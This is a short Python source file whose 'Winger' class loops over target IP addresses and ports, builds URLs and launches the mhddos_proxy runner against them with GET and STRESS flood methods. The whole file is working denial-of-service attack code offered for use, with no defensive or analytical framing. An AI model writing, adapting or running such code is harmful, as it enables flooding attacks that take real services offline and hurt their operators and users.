from spam_units import Unit
import subprocess


class Winger:
    def __init__(self, unit: Unit):
        self.unit = unit

    def attack(self):
        for ip in self.unit.ips:
            urls = []
            for port in ip.ports:
                url = ip.address + ":" + port.number
                if port.protocol == 'http':
                    urls.append('https://' + url)
                urls.append(port.protocol + '://' + url)

            subprocess.call(['python3', './mhddos_proxy/runner.py'] + urls + [
                '-p',
                '1200',
                '--http-methods',
                'GET',
                'STRESS',
                '--debug'
            ])
